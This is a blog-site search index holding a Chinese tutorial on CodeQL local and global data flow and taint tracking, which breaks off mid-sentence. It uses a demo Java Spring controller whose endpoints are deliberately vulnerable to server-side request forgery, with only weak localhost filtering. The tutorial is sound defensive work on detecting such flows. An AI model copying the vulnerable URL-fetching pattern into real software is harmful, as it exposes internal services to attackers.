<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CodeQL之数据流和污点追踪</title>
    <link href="/2024/09/08/CodeQL%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%B5%81%E5%92%8C%E6%B1%A1%E7%82%B9%E8%BF%BD%E8%B8%AA/"/>
    <url>/2024/09/08/CodeQL%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%B5%81%E5%92%8C%E6%B1%A1%E7%82%B9%E8%BF%BD%E8%B8%AA/</url>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>使用如下 java 代码进行演示（后面的示例都将使用该代码），该代码直接调用<code>URLConnection</code>方法存在 SSRF 漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.codeqltest.controller;<br><br><span class="hljs-keyword">import</span> com.example.codeqltest.util.HttpUtils;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.DecoderException;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.net.URLCodec;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> java.io.UnsupportedEncodingException;<br><br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/ssrf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SSRF</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(value = &quot;/One&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionOne</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-keyword">return</span> HttpUtils.URLConnection(url);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/Two&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionTwo</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">httpUrl</span> <span class="hljs-operator">=</span> url + <span class="hljs-string">&quot;#test&quot;</span>;<br>        <span class="hljs-keyword">return</span> HttpUtils.URLConnection(httpUrl);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/Three&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionThree</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-comment">// checkURL 检查 url 格式是否正确，如果正确在 checkURL 中调用 URLConnection</span><br>        <span class="hljs-keyword">return</span> HttpUtils.checkURL(url);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/Four&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionFour</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-comment">// filterURL 对传入的 url 进行过滤防止对内网发送请求</span><br>        <span class="hljs-keyword">if</span> (HttpUtils.filterURL(url)) &#123;<br>            <span class="hljs-keyword">return</span> HttpUtils.URLConnection(url);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/Five&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionFive</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-type">URLCodec</span> <span class="hljs-variable">codec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLCodec</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 使用第三方库对传入的 url 进行解码</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">decodedUrl</span> <span class="hljs-operator">=</span> codec.decode(url, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            <span class="hljs-keyword">return</span> HttpUtils.URLConnection(decodedUrl);<br>        &#125; <span class="hljs-keyword">catch</span> (UnsupportedEncodingException | DecoderException e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.codeqltest.util;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpUtils</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">URLConnection</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>            <span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(urlConnection.getInputStream())); <span class="hljs-comment">//send request</span><br>            String inputLine;<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>            <span class="hljs-keyword">while</span> ((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                html.append(inputLine);<br>            &#125;<br>            in.close();<br>            <span class="hljs-keyword">return</span> html.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            <span class="hljs-keyword">return</span> e.getMessage();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">filterURL</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InetAddress</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> InetAddress.getByName(url);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;127.0.0.1&quot;</span>.equals(address.getHostAddress())) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">checkURL</span><span class="hljs-params">(String url)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">urlRegex</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$&quot;</span>;<br>        <span class="hljs-type">Pattern</span> <span class="hljs-variable">urlPattern</span> <span class="hljs-operator">=</span> Pattern.compile(urlRegex);<br>        <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> urlPattern.matcher(url);<br>        <span class="hljs-keyword">if</span>(matcher.find())&#123;<br>           <span class="hljs-keyword">return</span> URLConnection(url);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过如下命令创建 CodeQL 数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">codeql database create /CodeQL/databases/javaCode-db --language=java  --<span class="hljs-built_in">command</span>=<span class="hljs-string">&quot;mvn clean install --file pom.xml -Dmaven.test.skip=true&quot;</span> --source-root=./JavaCodeDemo<br></code></pre></td></tr></table></figure><h1 id="局部数据流"><a href="#局部数据流" class="headerlink" title="局部数据流"></a>局部数据流</h1><blockquote><p>局部数据流是指在单个方法或可调用对象内的数据流。局部数据流通常比全局数据流更快速、高效和准确</p></blockquote><p>要使用数据流库需要先将其导入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import semmle<span class="hljs-selector-class">.code</span><span class="hljs-selector-class">.java</span><span class="hljs-selector-class">.dataflow</span>.DataFlow<br></code></pre></td></tr></table></figure><p>使用局部数据流的方式如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">DataFlow::localFlow(<span class="hljs-keyword">Node</span> <span class="hljs-title">node1</span>, <span class="hljs-keyword">Node</span> <span class="hljs-title">node2</span>)<br></code></pre></td></tr></table></figure><blockquote><p><code>DataFlow</code>模块中定义了类<code>Node</code>，表示数据可以流经的任何元素</p></blockquote><p>通过局部数据流查询调用了<code>URLConnection</code>方法的路由</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import java<br>import semmle.code.java.dataflow.DataFlow<br><br>from Callable callable, Call call,  DataFlow::Node source, DataFlow::Node sink<br>where<br>    callable.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">QualifiedName(<span class="hljs-string">&quot;com.example.codeqltest.util&quot;</span>, <span class="hljs-string">&quot;HttpUtils&quot;</span>)</span> <span class="hljs-keyword">and</span><br>    callable.get<span class="hljs-constructor">Name()</span> = <span class="hljs-string">&quot;URLConnection&quot;</span> <span class="hljs-keyword">and</span><br>    call.get<span class="hljs-constructor">Callee()</span> = callable <span class="hljs-keyword">and</span><br>    exists(Method m  <span class="hljs-pattern-match">| m.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">QualifiedName(<span class="hljs-string">&quot;com.example.codeqltest.controller&quot;</span>, <span class="hljs-string">&quot;SSRF&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    m.get<span class="hljs-constructor">Parameter(0)</span> = source.<span class="hljs-keyword">as</span><span class="hljs-constructor">Parameter()</span>) <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    call.get<span class="hljs-constructor">Argument(0)</span> = sink.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-constructor">DataFlow</span>::local<span class="hljs-constructor">Flow(<span class="hljs-params">source</span>, <span class="hljs-params">sink</span>)</span></span><br><span class="hljs-pattern-match">select source, call.get<span class="hljs-constructor">EnclosingCallable()</span></span><br></code></pre></td></tr></table></figure><p>运行后可以看到只查出方法 1 和方法 4，方法 3 没有查到是因为局部数据流只能查询单个方法内的数据流动，而在方法 2 和方法 5 中，<code>source</code>并没有直接进入到<code>URLConnection</code>方法中，因此也没有查到，这里要用到局部污点追踪</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1725785634218-7ff4e388-47f3-44ac-9c4f-b800961da4c8.png" alt="image.png"></p><p>上面的 CodeQL 查询可以进行一下简化，使用如下写法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">DataFlow::local<span class="hljs-constructor">Flow(DataFlow::<span class="hljs-params">parameterNode</span>(<span class="hljs-params">source</span>)</span>, DataFlow::expr<span class="hljs-constructor">Node(<span class="hljs-params">sink</span>)</span>)<br></code></pre></td></tr></table></figure><blockquote><ul><li><code>ParameterNode</code>相当于<code>source.asParameter()</code></li><li><code>ExprNode</code>相当于<code>sink.asExpr()</code></li></ul></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import java<br>import semmle.code.java.dataflow.DataFlow<br><br>from Callable callable, Call call, Parameter p<br>where<br>  callable.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">QualifiedName(<span class="hljs-string">&quot;com.example.codeqltest.util&quot;</span>, <span class="hljs-string">&quot;HttpUtils&quot;</span>)</span> <span class="hljs-keyword">and</span><br>  callable.get<span class="hljs-constructor">Name()</span> = <span class="hljs-string">&quot;URLConnection&quot;</span> <span class="hljs-keyword">and</span><br>  exists(Method m  <span class="hljs-pattern-match">| m.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">QualifiedName(<span class="hljs-string">&quot;com.example.codeqltest.controller&quot;</span>, <span class="hljs-string">&quot;SSRF&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">  m.get<span class="hljs-constructor">Parameter(0)</span> = p) <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">  call.get<span class="hljs-constructor">Callee()</span> = callable <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">  <span class="hljs-constructor">DataFlow</span>::local<span class="hljs-constructor">Flow(DataFlow::<span class="hljs-params">parameterNode</span>(<span class="hljs-params">p</span>)</span>, <span class="hljs-constructor">DataFlow</span>::expr<span class="hljs-constructor">Node(<span class="hljs-params">call</span>.<span class="hljs-params">getArgument</span>(0)</span>))</span><br><span class="hljs-pattern-match">select p, call.get<span class="hljs-constructor">EnclosingCallable()</span></span><br></code></pre></td></tr></table></figure><h1 id="局部污点追踪"><a href="#局部污点追踪" class="headerlink" title="局部污点追踪"></a>局部污点追踪</h1><p>对于污点追踪来说，如果<code>x</code>是一个受污染的字符串，那么<code>y</code>也同样受到了污染</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> x;<br><span class="hljs-type">String</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> temp + <span class="hljs-string">&quot;, &quot;</span> + temp;<br></code></pre></td></tr></table></figure><p>先做如下导入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import semmle<span class="hljs-selector-class">.code</span><span class="hljs-selector-class">.java</span><span class="hljs-selector-class">.dataflow</span>.TaintTracking<br></code></pre></td></tr></table></figure><p>使用方式如下，跟局部数据流的用法大同小异</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">TaintTracking::local<span class="hljs-constructor">Taint(DataFlow::<span class="hljs-params">parameterNode</span>(<span class="hljs-params">source</span>)</span>, DataFlow::expr<span class="hljs-constructor">Node(<span class="hljs-params">sink</span>)</span>)<br></code></pre></td></tr></table></figure><p>只需要对上面的查询做微小的改动，查询写法如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import java<br>import semmle.code.java.dataflow.TaintTracking<br><br>from Callable callable, Call call, Parameter p<br>where<br>  callable.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">QualifiedName(<span class="hljs-string">&quot;com.example.codeqltest.util&quot;</span>, <span class="hljs-string">&quot;HttpUtils&quot;</span>)</span> <span class="hljs-keyword">and</span><br>  callable.get<span class="hljs-constructor">Name()</span> = <span class="hljs-string">&quot;URLConnection&quot;</span> <span class="hljs-keyword">and</span><br>  exists(Method m  <span class="hljs-pattern-match">| m.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">QualifiedName(<span class="hljs-string">&quot;com.example.codeqltest.controller&quot;</span>, <span class="hljs-string">&quot;SSRF&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    m.get<span class="hljs-constructor">Parameter(0)</span> = p) <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">  call.get<span class="hljs-constructor">Callee()</span> = callable <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">  <span class="hljs-constructor">TaintTracking</span>::local<span class="hljs-constructor">Taint(DataFlow::<span class="hljs-params">parameterNode</span>(<span class="hljs-params">p</span>)</span>, <span class="hljs-constructor">DataFlow</span>::expr<span class="hljs-constructor">Node(<span class="hljs-params">call</span>.<span class="hljs-params">getArgument</span>(0)</span>))</span><br><span class="hljs-pattern-match">select p, call.get<span class="hljs-constructor">EnclosingCallable()</span></span><br></code></pre></td></tr></table></figure><p>查询结果如下，方法 3 没查询出来是对的，方法 5 没查询到的原因后面会讲到</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1725786783996-e0b90c0d-215b-4c60-8bde-cf34d9fd977b.png" alt="img"></p><h1 id="全局数据流"><a href="#全局数据流" class="headerlink" title="全局数据流"></a>全局数据流</h1><blockquote><p>全局数据流跟踪整个程序的数据流，全局数据流的精确度低于局部数据流，分析需要更多的时间和内存来执行。</p></blockquote><p>通过实现<code>DataFlow::ConfigSig</code>签名，并应用模块<code>DataFlow::Global&lt;ConfigSig&gt;</code>来使用全局数据流库</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">import semmle.code.java.dataflow.<span class="hljs-title class_">DataFlow</span><br><br><span class="hljs-keyword">module</span> <span class="hljs-title class_">MyFlowConfiguration</span> implements <span class="hljs-title class_">DataFlow</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:ConfigSig</span> &#123;<br>  predicate isSource(<span class="hljs-title class_">DataFlow</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Node</span> source) &#123;<br>    ...<br>  &#125;<br><br>  predicate isSink(<span class="hljs-title class_">DataFlow</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Node</span> sink) &#123;<br>    ...<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">module</span> <span class="hljs-title class_">MyFlow</span> = <span class="hljs-title class_">DataFlow</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Global&lt;MyFlowConfiguration&gt;</span>;<br></code></pre></td></tr></table></figure><blockquote><p><code>isSource</code>和<code>isSink</code>这两个谓词是必须要实现的，通过这两个谓词来定义<code>source</code>和<code>sink</code>，还有两个谓词<code>isBarrier</code>和<code>isAdditionalFlowStep</code>是可选的，这两个谓词在后面的全局污点追踪中会用到</p></blockquote><p>查询写法如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import java<br>import semmle.code.java.dataflow.DataFlow<br>import semmle.code.java.dataflow.FlowSources<br><br><span class="hljs-keyword">module</span> MyFlowConfiguration implements DataFlow::ConfigSig &#123;<br><br>  predicate is<span class="hljs-constructor">Source(DataFlow::Node <span class="hljs-params">source</span>)</span> &#123;<br>    source instanceof RemoteFlowSource<br>  &#125;<br><br>  predicate is<span class="hljs-constructor">Sink(DataFlow::Node <span class="hljs-params">sink</span>)</span> &#123;<br>   exists(MethodCall ma <span class="hljs-pattern-match">| ma.get<span class="hljs-constructor">Method()</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;URLConnection&quot;</span>)</span> <span class="hljs-keyword">and</span> </span><br><span class="hljs-pattern-match">   ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;HttpUtils&quot;</span>)</span> <span class="hljs-keyword">and</span> </span><br><span class="hljs-pattern-match">   sink.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>=ma.get<span class="hljs-constructor">AnArgument()</span> )</span><br><span class="hljs-pattern-match">  &#125;</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match"><span class="hljs-keyword">module</span> <span class="hljs-constructor">MyFlow</span> = <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">Global</span>&lt;<span class="hljs-constructor">MyFlowConfiguration</span>&gt;;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">from <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">Node</span> source, <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">Node</span> sink</span><br><span class="hljs-pattern-match">where <span class="hljs-constructor">MyFlow</span>::flow(source, sink)</span><br><span class="hljs-pattern-match">select source, source.get<span class="hljs-constructor">EnclosingCallable()</span>, sink, sink.get<span class="hljs-constructor">EnclosingCallable()</span></span><br></code></pre></td></tr></table></figure><p>查询结果如下，这次成功查到了方法 3</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1725787952674-cb7e0dd3-a03e-4600-9180-b688103a66db.png" alt="image.png"></p><h1 id="全局污点追踪"><a href="#全局污点追踪" class="headerlink" title="全局污点追踪"></a>全局污点追踪</h1><p>全局污点跟踪与全局数据流的关系就像局部污点跟踪与局部数据流的关系，只不过这里使用的模块是<code>TaintTracking::Global&lt;ConfigSig&gt;</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">import semmle.code.java.dataflow.<span class="hljs-title class_">TaintTracking</span><br><br><span class="hljs-keyword">module</span> <span class="hljs-title class_">MyFlowConfiguration</span> implements <span class="hljs-title class_">DataFlow</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:ConfigSig</span> &#123;<br>  predicate isSource(<span class="hljs-title class_">DataFlow</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Node</span> source) &#123;<br>    ...<br>  &#125;<br><br>  predicate isSink(<span class="hljs-title class_">DataFlow</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Node</span> sink) &#123;<br>    ...<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">module</span> <span class="hljs-title class_">MyFlow</span> = <span class="hljs-title class_">TaintTracking</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Global&lt;MyFlowConfiguration&gt;</span>;<br></code></pre></td></tr></table></figure><p>查询写法如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import java<br>import semmle.code.java.dataflow.TaintTracking<br>import semmle.code.java.dataflow.FlowSources<br><br><span class="hljs-keyword">module</span> MyFlowConfiguration implements DataFlow::ConfigSig &#123;<br><br>  predicate is<span class="hljs-constructor">Source(DataFlow::Node <span class="hljs-params">source</span>)</span> &#123;<br>    source instanceof RemoteFlowSource<br>  &#125;<br><br>  predicate is<span class="hljs-constructor">Sink(DataFlow::Node <span class="hljs-params">sink</span>)</span> &#123;<br>   exists(MethodCall ma <span class="hljs-pattern-match">| ma.get<span class="hljs-constructor">Method()</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;URLConnection&quot;</span>)</span> <span class="hljs-keyword">and</span> </span><br><span class="hljs-pattern-match">   ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;HttpUtils&quot;</span>)</span> <span class="hljs-keyword">and</span> </span><br><span class="hljs-pattern-match">   sink.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>=ma.get<span class="hljs-constructor">AnArgument()</span> )</span><br><span class="hljs-pattern-match">  &#125;</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match"><span class="hljs-keyword">module</span> <span class="hljs-constructor">MyFlow</span> = <span class="hljs-constructor">TaintTracking</span>::<span class="hljs-constructor">Global</span>&lt;<span class="hljs-constructor">MyFlowConfiguration</span>&gt;;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">from <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">Node</span> source, <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">Node</span> sink</span><br><span class="hljs-pattern-match">where <span class="hljs-constructor">MyFlow</span>::flow(source, sink)</span><br><span class="hljs-pattern-match">select source, source.get<span class="hljs-constructor">EnclosingCallable()</span>, sink, sink.get<span class="hljs-constructor">EnclosingCallable()</span></span><br></code></pre></td></tr></table></figure><p>通过该查询可以看到还是无法查询到方法 5</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1725788367821-58b3277d-093f-4cd0-a390-422e63fbf528.png" alt="image.png"></p><p>在 CodeQL 的 <a href="https://github.com/github/codeql/issues/6729">issue</a> 中有提到</p><blockquote><p>在进行流分析和污点分析时，<u>CodeQL 